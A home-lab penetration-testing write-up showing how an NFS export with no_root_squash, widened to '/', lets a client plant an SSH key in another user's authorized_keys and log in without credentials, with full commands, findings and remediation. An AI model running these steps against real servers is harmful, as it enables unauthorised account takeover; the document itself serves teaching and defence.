# NFS no_root_squash Privilege Escalation

## Overview

Following the build of an NFS server in my home penetration-testing lab, I assessed it from Kali Linux to determine whether `root_squash` was protecting the export as intended, and what an attacker could achieve if that protection was absent.

This exercise covers two related findings. The first is the `no_root_squash` misconfiguration itself — unauthorised root-level write access through the export. The second is a chained consequence of the first: using that write access to plant an SSH key and obtain an interactive login as a different local user, with no prior credentials.

> **Scope:** All testing documented here was performed against systems in my isolated home lab. The NFS server was deliberately configured to be vulnerable for training purposes.

---

## Lab Scope

| System        | Role       | IP Address      |
| ------------- | ---------- | --------------- |
| Kali Linux    | Attacker   | `192.168.50.10` |
| Ubuntu Server | NFS target | `192.168.50.20` |

The target was already known, from building the lab, to run NFS and export `/srv/nfs/share`. The objective of this assessment was to determine what privileges that export actually granted a client, and how far those privileges could be pushed.

---

# Part 1 — `no_root_squash` Write Access

## 1. Confirming the Export

Before testing privileges, I re-confirmed the export was reachable and enumerable from Kali, treating the target as I would any unfamiliar host:

```
sudo nmap -sV -p2049 192.168.50.20
showmount -e 192.168.50.20
```

Both confirmed NFS was running and `/srv/nfs/share` was exported to `192.168.50.10`.

## 2. Mounting and Testing as Root

```
sudo mkdir -p /mnt/nfs-share
sudo mount -t nfs 192.168.50.20:/srv/nfs/share /mnt/nfs-share
sudo touch /mnt/nfs-share/root-test-file
ls -la /mnt/nfs-share/root-test-file
```

The created file was owned by `root:root` on the server, confirming that root on the Kali client retained genuine root privileges over files in the export — the server was not remapping the client's asserted UID 0, which is the behaviour `root_squash` exists to prevent.

## Finding 1: NFS `no_root_squash` Unauthorised Root Write Access

### Description

The export was configured with `no_root_squash`, allowing a client's root user to write to the server's filesystem with genuine root-equivalent privileges rather than having that identity remapped to an unprivileged account.

### Evidence

```
sudo touch /mnt/nfs-share/root-test-file
```

The resulting file was owned by `root:root` on the server, confirmed via:

```
ls -la /mnt/nfs-share/root-test-file
```

### Security Impact

Any user with root access to a host permitted to mount the export can create, modify, or delete files within it as root on the server — including files that other services on the server implicitly trust by ownership (for example, configuration files, scripts, or SSH-related files, depending on export scope).

### Remediation

- Retain `root_squash` (the default) unless a specific, documented, and justified reason exists to disable it.
- Where client root access genuinely cannot be trusted at all, consider `all_squash`.
- Restrict exports to the minimum set of authorised hosts, as was already done for this export (`192.168.50.10` only).

---

# Part 2 — Chained SSH Key Privilege Escalation

With unauthorised root write access confirmed, I tested how far that access could be taken — specifically, whether it could be used to compromise an account on the server directly, rather than just writing arbitrary files into the exported directory.

## 3. Expanding the Export

The original export only exposed `/srv/nfs/share`, which limited impact to that directory. To test the full severity of the misconfiguration, I expanded the export to cover the server's entire filesystem:

```
/  192.168.50.10(rw,no_root_squash,no_subtree_check)
```

```
sudo exportfs -ra
sudo systemctl restart nfs-kernel-server
```

Exporting `/` alongside `no_root_squash` meant every file on the server — including other users' home directories and SSH configuration — became reachable with root privileges through the mount.

## 4. Mounting the Full Export and Identifying a Target

```
sudo mkdir -p /mnt/nfs-root
sudo mount -t nfs 192.168.50.20:/ /mnt/nfs-root
sudo ls -la /mnt/nfs-root/home
```

I selected an ordinary local account (`nosheena`) rather than targeting `root` directly, to show the technique compromises any reachable account, not only root's own files. I confirmed the account already had an `.ssh` directory:

```
sudo ls -la /mnt/nfs-root/home/nosheena/.ssh
```

## 5. Generating a Keypair and Writing `authorized_keys`

```
ssh-keygen -t ed25519 -f ~/nfs_exploit_key -N ""
```

```
sudo cat /mnt/nfs-root/home/nosheena/.ssh/authorized_keys
sudo sh -c 'cat /home/<kali-user>/nfs_exploit_key.pub >> /mnt/nfs-root/home/nosheena/.ssh/authorized_keys'
```

The write was wrapped in `sh -c '...'` because `sudo` elevates only the command it precedes (`cat`), not the `>>` redirection that follows — without the wrapper, the redirection would still run as my unprivileged user, which has no write access to another account's home directory.

## 6. Matching Ownership and Permissions

`sshd` enforces strict permission checks on `authorized_keys` and silently ignores keys that don't meet them:

```
sudo stat -c '%u %g' /mnt/nfs-root/home/nosheena
sudo chown 1000:1000 /mnt/nfs-root/home/nosheena/.ssh/authorized_keys
sudo chmod 600 /mnt/nfs-root/home/nosheena/.ssh/authorized_keys
```

## 7. Authenticating as the Target User

```
ssh -i ~/nfs_exploit_key nosheena@192.168.50.20
```

The login succeeded immediately, with no password and no prior credentials for the account.

## Finding 2: NFS no_root_squash Enabling SSH Key-Based Account Compromise

### Description

Root-level write access through the `no_root_squash` export (Finding 1), combined with an export scope covering `/`, allowed an attacker to write directly into a local user's `authorized_keys` file and authenticate as that user via SSH.

### Evidence

```
sudo sh -c 'cat nfs_exploit_key.pub >> /mnt/nfs-root/home/nosheena/.ssh/authorized_keys'
ssh -i ~/nfs_exploit_key nosheena@192.168.50.20
```

The SSH connection succeeded without a password, confirming the planted key was trusted by `sshd`.

### Security Impact

This escalates the impact of Finding 1 from "unauthorised file writes within an export" to full account compromise on the server. An attacker with root access to any host permitted to mount the export can obtain an interactive login as any local user whose home directory is reachable — and, if `root`'s own `authorized_keys` is reachable, direct root-level SSH access.

The vulnerability requires no flaw in SSH itself; SSH behaved exactly as designed. The weakness is entirely in the NFS export configuration permitting an untrusted client to write into a location SSH implicitly trusts.

### Remediation

- Never export `/` or other broad, high-value paths over NFS; scope exports to the minimum directory required.
- Apply the Finding 1 remediations (`root_squash`, `all_squash`, host restriction) — they prevent this chained finding as well, since it has no path to occur without Finding 1.
- For environments requiring stronger assurance than UID-based trust, use NFSv4 with Kerberos (`sec=krb5p`), which authenticates principals cryptographically rather than trusting client-supplied UIDs.
- Periodically audit `/etc/exports` for options enabled temporarily during testing or troubleshooting and never reverted.

---

# Key Lessons

- `root_squash` is the specific control preventing a client's root user from becoming the server's root; `no_root_squash` removes it entirely, and the two findings in this exercise exist only because of that one setting.
- The severity of `no_root_squash` scales directly with export scope — the same misconfiguration on `/srv/nfs/share` caused unauthorised writes in one directory; on `/`, it enabled full account compromise.
- NFS misconfiguration can lead directly to SSH-level account compromise without any flaw in SSH itself.
- `sudo` only elevates the specific command it precedes; shell redirections after it still run as the invoking user, which matters when writing into root-owned or other-user-owned paths.
- Treating "unauthorised root write access" and "account compromise via that access" as two distinct, individually-evidenced findings made both the severity and the remediation clearer than reporting them as a single combined issue.

---

# Assessment Summary

Starting from a server already known to run NFS, I confirmed the export was reachable, then tested root-level write access and found the server honoured a client's asserted root identity directly — Finding 1. I then expanded the scope of that access by widening the export to `/`, and used the resulting write access to plant a trusted SSH key in a local user's `authorized_keys`, authenticating as that user with no password and no prior credentials — Finding 2.

Together, these findings demonstrate that an NFS `no_root_squash` misconfiguration is not merely a file-sharing inconvenience but, depending on export scope, a direct path to account compromise on the exporting server.

---

## Related Lab

For the server-side build and export configuration that preceded this assessment, see:

`04-vulnerable-nfs-server.md`
